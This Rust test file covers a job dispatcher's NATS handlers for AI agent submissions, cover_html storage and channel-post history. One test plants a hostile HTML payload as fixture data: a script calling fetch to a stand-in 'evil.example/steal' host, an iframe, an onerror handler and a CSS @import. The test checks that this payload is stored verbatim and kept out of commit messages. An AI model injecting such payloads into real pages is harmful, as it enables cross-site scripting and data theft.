//! Tier-2 test for the container-facing NATS handlers (§4.2/§6.1): agents
//! submit over req.work.submit / req.eval.submit exactly like the channel MCP
//! binary does — bounded-retry request until the dispatcher acks.

#![allow(clippy::unwrap_used, clippy::expect_used)]

use dispatcher::core::{Core, CoreConfig, CreateSpec};
use dispatcher::handlers::spawn_container_handlers;
use std::sync::Arc;
use std::time::Duration;
use store::NatsStore;
use test_utils::repo::TempRepo;
use test_utils::{FakeBackend, FakeProvider};
use types::JobState;

mod common;
use common::{assert_invariants_of, spawn_checked};

const IMPL_AGENT: &str = r#"
name: impl-agent
image: img:latest
work:
  type: agent
  prompt: prompts/impl.md
eval:
  - name: reviewer
    type: agent
    prompt: prompts/eval.md
"#;

#[tokio::test]
#[allow(
    clippy::too_many_lines,
    reason = "TODO(style): oversized tier-2 test — split when this file is next touched."
)]
async fn submits_flow_over_nats_to_the_core() {
    let Some(server) = test_utils::nats::NatsTestServer::shared().await else {
        return;
    };
    let store = NatsStore::connect_namespaced(server.url(), &test_utils::unique_prefix())
        .await
        .unwrap();
    store.ensure_topology().await.unwrap();
    let repo = TempRepo::create("acme", "api").await;
    let clone = repo.clone_branch("main").await;
    clone
        .commit_file("jobs/impl-agent.yaml", IMPL_AGENT.as_bytes(), "type")
        .await;
    clone
        .commit_file("prompts/impl.md", b"implement", "p")
        .await;
    clone.commit_file("prompts/eval.md", b"review", "p").await;
    clone.push("main").await;

    let provider = Arc::new(FakeProvider::new());
    let repos_root = repo
        .bare_path()
        .parent()
        .unwrap()
        .parent()
        .unwrap()
        .to_path_buf();
    let core = Core::new(
        store.clone(),
        vcs::RepoManager::new(repos_root),
        Arc::new(FakeBackend::new()),
        provider.clone(),
        CoreConfig {
            repo_url_base: "file:///repos".into(),
            nats_url: server.url().into(),
            ..Default::default()
        },
    )
    .await
    .unwrap();
    let (handle, sink) = spawn_checked(core);
    spawn_container_handlers(&store, handle.clone())
        .await
        .unwrap();

    let bare = repo.bare_path();
    let submit_store = store.clone();
    provider.on_run(move |cfg| async move {
        let branch = cfg.env.get("JOB_BRANCH").unwrap().clone();
        assert_eq!(
            cfg.env.get("CHANNEL_ROLE").map(String::as_str),
            Some("work")
        );
        let clone = test_utils::repo::clone_branch_from(&bare, &branch).await;
        clone.commit_file("src/f.rs", b"fn f() {}", "impl").await;
        clone.push(&branch).await;
        submit_store
            .request_with_retry(
                "req.work.submit.acme.api.1",
                br#"{"summary":"added f()"}"#,
                10,
                Duration::from_millis(200),
            )
            .await
            .unwrap();
    });
    let eval_store = store.clone();
    provider.on_run(move |cfg| async move {
        assert_eq!(
            cfg.env.get("CHANNEL_ROLE").map(String::as_str),
            Some("eval")
        );
        let task_id = cfg.env.get("JOB_TASK_ID").unwrap();
        let subject = format!("req.eval.submit.acme.api.1.{task_id}");
        let bad = eval_store
            .request_with_retry(&subject, br#"{}"#, 3, Duration::from_millis(100))
            .await
            .unwrap();
        assert!(String::from_utf8_lossy(&bad.payload).contains("error"));
        let ok = eval_store
            .request_with_retry(
                &subject,
                br#"{"pass":true}"#,
                10,
                Duration::from_millis(200),
            )
            .await
            .unwrap();
        assert!(String::from_utf8_lossy(&ok.payload).contains("ok"));
    });

    let job = handle
        .create_job(CreateSpec {
            owner: "acme".into(),
            project: "api".into(),
            r#type: "impl-agent".into(),
            title: String::new(),
            description: String::new(),
            cover_html: None,
            deps: vec![],
            knowledge_tags: vec![],
            eval: vec![],
            timeout: None,
            model: None,
            factory: None,
            schedule: None,
            members: vec![],
            inputs: Default::default(),
            groups: vec![],
            draft: false,
        })
        .await
        .unwrap();
    assert_invariants_of(&sink);
    handle.release_job("acme", "api", job.id).await.unwrap();
    assert_invariants_of(&sink);

    test_utils::wait::job_state(&store, "acme", "api", 1, JobState::Done).await;
    let done = store
        .jobs()
        .await
        .unwrap()
        .get("acme", "api", 1)
        .await
        .unwrap()
        .unwrap();
    assert_eq!(done.state, JobState::Done);
    assert!(
        done.completed_at.is_some(),
        "a job reaching Done must carry completed_at"
    );

    let log = repo.manager.log("acme", "api", None, 1).await.unwrap();
    assert!(
        format!("{log:?}").contains("job/1: impl-agent"),
        "squash commit subject missing: {log:?}"
    );
    assert_invariants_of(&sink);
}

/// Job #143: an agent may attach an optional `cover_html` to `submit_result`.
/// It rides the same NATS ingest path, is size-capped-and-rejected (not
/// truncated) at ingest, is stored verbatim on the task record (served through
/// the task API), and never touches the squash-merge commit body.
///
/// Containment model (shared with #125's `Job::cover_html`, spec §1.1/§4.3):
/// "sanitized" here means **size-capped at ingest** and rendered only inside a
/// fully-sandboxed, CSP-locked iframe (no scripts, no forms, no network — see
/// `web/src/components/CoverWidget.tsx`). Hostile markup is therefore neutralized
/// at the single shared render choke point, so ingest stores the bytes verbatim
/// rather than running an allowlist stripper — one model, both producers. This
/// test proves genuinely hostile HTML (a `<script>`, an `<iframe>`, an inline
/// `onerror`, an external `<img>`/CSS `@import` fetch) survives ingest untouched
/// and, being presentational, never leaks into the squash body.
#[tokio::test]
#[allow(
    clippy::too_many_lines,
    reason = "TODO(style): oversized tier-2 test — split when this file is next touched."
)]
async fn work_cover_html_round_trips_over_nats_and_absent_from_squash() {
    let Some(server) = test_utils::nats::NatsTestServer::shared().await else {
        return;
    };
    let store = NatsStore::connect_namespaced(server.url(), &test_utils::unique_prefix())
        .await
        .unwrap();
    store.ensure_topology().await.unwrap();
    let repo = TempRepo::create("acme", "api").await;
    let clone = repo.clone_branch("main").await;
    clone
        .commit_file("jobs/impl-agent.yaml", IMPL_AGENT.as_bytes(), "type")
        .await;
    clone
        .commit_file("prompts/impl.md", b"implement", "p")
        .await;
    clone.commit_file("prompts/eval.md", b"review", "p").await;
    clone.push("main").await;

    let provider = Arc::new(FakeProvider::new());
    let repos_root = repo
        .bare_path()
        .parent()
        .unwrap()
        .parent()
        .unwrap()
        .to_path_buf();
    let core = Core::new(
        store.clone(),
        vcs::RepoManager::new(repos_root),
        Arc::new(FakeBackend::new()),
        provider.clone(),
        CoreConfig {
            repo_url_base: "file:///repos".into(),
            nats_url: server.url().into(),
            ..Default::default()
        },
    )
    .await
    .unwrap();
    let (handle, sink) = spawn_checked(core);
    spawn_container_handlers(&store, handle.clone())
        .await
        .unwrap();

    let bare = repo.bare_path();
    let submit_store = store.clone();
    provider.on_run(move |cfg| async move {
        let branch = cfg.env.get("JOB_BRANCH").unwrap().clone();
        let clone = test_utils::repo::clone_branch_from(&bare, &branch).await;
        clone.commit_file("src/f.rs", b"fn f() {}", "impl").await;
        clone.push(&branch).await;

        let huge = "x".repeat(64 * 1024 + 1);
        let payload = serde_json::json!({ "summary": "added f()", "cover_html": huge });
        let rejected = submit_store
            .request_with_retry(
                "req.work.submit.acme.api.1",
                serde_json::to_vec(&payload).unwrap().as_slice(),
                10,
                Duration::from_millis(200),
            )
            .await
            .unwrap();
        let body = String::from_utf8_lossy(&rejected.payload);
        assert!(
            body.contains("error") && body.contains("cover_html"),
            "{body}"
        );

        let hostile = "<script>fetch('http://evil.example/steal')</script>\
             <iframe src=\"http://evil.example/frame\"></iframe>\
             <img src=\"http://evil.example/pixel.png\" onerror=\"alert(1)\">\
             <style>@import url('http://evil.example/x.css');</style>\
             <h1>COVERMARKER</h1>";
        let payload = serde_json::json!({ "summary": "added f()", "cover_html": hostile });
        submit_store
            .request_with_retry(
                "req.work.submit.acme.api.1",
                serde_json::to_vec(&payload).unwrap().as_slice(),
                10,
                Duration::from_millis(200),
            )
            .await
            .unwrap();
    });
    let eval_store = store.clone();
    provider.on_run(move |cfg| async move {
        let task_id = cfg.env.get("JOB_TASK_ID").unwrap();
        let subject = format!("req.eval.submit.acme.api.1.{task_id}");
        eval_store
            .request_with_retry(
                &subject,
                br#"{"pass":true}"#,
                10,
                Duration::from_millis(200),
            )
            .await
            .unwrap();
    });

    let job = handle
        .create_job(CreateSpec {
            owner: "acme".into(),
            project: "api".into(),
            r#type: "impl-agent".into(),
            title: String::new(),
            description: String::new(),
            cover_html: None,
            deps: vec![],
            knowledge_tags: vec![],
            eval: vec![],
            timeout: None,
            model: None,
            factory: None,
            schedule: None,
            members: vec![],
            inputs: Default::default(),
            groups: vec![],
            draft: false,
        })
        .await
        .unwrap();
    assert_invariants_of(&sink);
    handle.release_job("acme", "api", job.id).await.unwrap();
    assert_invariants_of(&sink);

    test_utils::wait::job_state(&store, "acme", "api", 1, JobState::Done).await;
    assert_eq!(
        store
            .jobs()
            .await
            .unwrap()
            .get("acme", "api", 1)
            .await
            .unwrap()
            .unwrap()
            .state,
        JobState::Done
    );

    let tasks = store
        .tasks()
        .await
        .unwrap()
        .list_for_job("acme", "api", 1)
        .await
        .unwrap();
    let work = tasks
        .iter()
        .find(|t| t.phase == types::TaskPhase::Work)
        .expect("work task");
    match &work.result {
        Some(types::TaskResult::Work {
            summary: Some(s),
            cover_html: Some(c),
            ..
        }) => {
            assert_eq!(s, "added f()");
            for marker in [
                "<script>",
                "<iframe",
                "onerror=",
                "http://evil.example",
                "@import",
                "COVERMARKER",
            ] {
                assert!(
                    c.contains(marker),
                    "hostile cover not stored verbatim ({marker}): {c}"
                );
            }
        }
        other => panic!("expected a Work result carrying the cover, got {other:?}"),
    }

    let out = tokio::process::Command::new("git")
        .args(["log", "-1", "--format=%B", "main"])
        .current_dir(repo.bare_path())
        .output()
        .await
        .unwrap();
    let body = String::from_utf8_lossy(&out.stdout).to_string();
    assert!(
        body.contains("added f()"),
        "summary missing from squash: {body:?}"
    );
    for leaked in ["COVERMARKER", "evil.example", "<script>"] {
        assert!(
            !body.contains(leaked),
            "cover_html must never reach the squash body ({leaked}): {body:?}"
        );
    }
    assert_invariants_of(&sink);
}

/// Channel posts used to be written straight to `channels` KV by the container:
/// a second writer to platform state, last-write-wins, invisible to the
/// dispatcher, in a bucket with a 7-day TTL. So an agent's progress narrative
/// was destroyed as it was written.
///
/// Now each post goes through the dispatcher, which keeps the KV entry as the
/// latest-value cache §6.2's `GET .../status` reads, and publishes an event
/// that *is* the history.
#[tokio::test]
#[allow(
    clippy::too_many_lines,
    reason = "TODO(style): oversized tier-2 test — split when this file is next touched."
)]
async fn channel_posts_accumulate_as_history_instead_of_overwriting() {
    let Some(server) = test_utils::nats::NatsTestServer::shared().await else {
        return;
    };
    let store = NatsStore::connect_namespaced(server.url(), &test_utils::unique_prefix())
        .await
        .unwrap();
    store.ensure_topology().await.unwrap();
    let repo = TempRepo::create("acme", "api").await;
    let clone = repo.clone_branch("main").await;
    clone
        .commit_file("jobs/impl-agent.yaml", IMPL_AGENT.as_bytes(), "type")
        .await;
    clone
        .commit_file("prompts/impl.md", b"implement", "p")
        .await;
    clone.commit_file("prompts/eval.md", b"review", "p").await;
    clone.push("main").await;

    let provider = Arc::new(FakeProvider::new());
    let repos_root = repo
        .bare_path()
        .parent()
        .unwrap()
        .parent()
        .unwrap()
        .to_path_buf();
    let core = Core::new(
        store.clone(),
        vcs::RepoManager::new(repos_root),
        Arc::new(FakeBackend::new()),
        provider.clone(),
        CoreConfig {
            repo_url_base: "file:///repos".into(),
            nats_url: server.url().into(),
            ..Default::default()
        },
    )
    .await
    .unwrap();
    let (handle, sink) = spawn_checked(core);
    spawn_container_handlers(&store, handle.clone())
        .await
        .unwrap();

    let post_store = store.clone();
    provider.on_run(move |_cfg| async move {
        for body in [
            br#"{"message":"cloning","percent":10,"task_id":1,"phase":"Work"}"#.as_slice(),
            br#"{"message":"running tests","percent":60}"#.as_slice(),
        ] {
            let reply = post_store
                .request_with_retry(
                    "req.channel.update.acme.api.1",
                    body,
                    10,
                    Duration::from_millis(200),
                )
                .await
                .unwrap();
            assert!(String::from_utf8_lossy(&reply.payload).contains("ok"));
        }
        post_store
            .request_with_retry(
                "req.channel.reply.acme.api.1",
                br#"{"text":"on it","sent_at":"2026-07-16T10:00:00Z"}"#,
                10,
                Duration::from_millis(200),
            )
            .await
            .unwrap();
    });

    let job = handle
        .create_job(CreateSpec {
            owner: "acme".into(),
            project: "api".into(),
            r#type: "impl-agent".into(),
            title: String::new(),
            description: String::new(),
            cover_html: None,
            deps: vec![],
            knowledge_tags: vec![],
            eval: vec![],
            timeout: None,
            model: None,
            factory: None,
            schedule: None,
            members: vec![],
            inputs: Default::default(),
            groups: vec![],
            draft: false,
        })
        .await
        .unwrap();
    assert_invariants_of(&sink);
    let mut events_sub = store
        .subscribe_stream(
            "job-events",
            "job.events.acme.api.1.>",
            store::StreamStart::All,
        )
        .await
        .unwrap();
    handle.release_job("acme", "api", job.id).await.unwrap();
    assert_invariants_of(&sink);

    let mut updates: Vec<serde_json::Value> = Vec::new();
    let mut replies: Vec<serde_json::Value> = Vec::new();
    let deadline = tokio::time::Instant::now() + std::time::Duration::from_secs(30);
    while updates.len() < 2 || replies.is_empty() {
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        let next = tokio::time::timeout(remaining, events_sub.next()).await;
        let Ok(Some((_seq, _subject, bytes))) = next else {
            panic!("timed out collecting channel events: updates={updates:?} replies={replies:?}");
        };
        if let Ok(v) = serde_json::from_slice::<serde_json::Value>(&bytes) {
            match v["event_type"].as_str() {
                Some("channel-update") => updates.push(v),
                Some("channel-reply") => replies.push(v),
                _ => {}
            }
        }
    }
    assert_eq!(updates.len(), 2, "both updates must survive: {updates:?}");
    assert_eq!(updates[0]["message"], "cloning");
    assert_eq!(updates[0]["percent"], 10);
    assert_eq!(updates[0]["task_id"], 1);
    assert_eq!(updates[0]["phase"], "Work");
    assert_eq!(updates[1]["message"], "running tests");
    assert!(updates[1].get("task_id").is_none());
    assert_eq!(replies.len(), 1, "reply recorded: {replies:?}");
    assert_eq!(replies[0]["text"], "on it");

    let entry: serde_json::Value = store
        .raw_bucket(store::buckets::CHANNELS)
        .await
        .unwrap()
        .get_json(&store::keys::channel_key("acme", "api", 1))
        .await
        .unwrap()
        .expect("channel entry");
    assert_eq!(entry["update"]["message"], "running tests");
    assert_eq!(entry["last_reply"]["text"], "on it");
    assert_invariants_of(&sink);
}
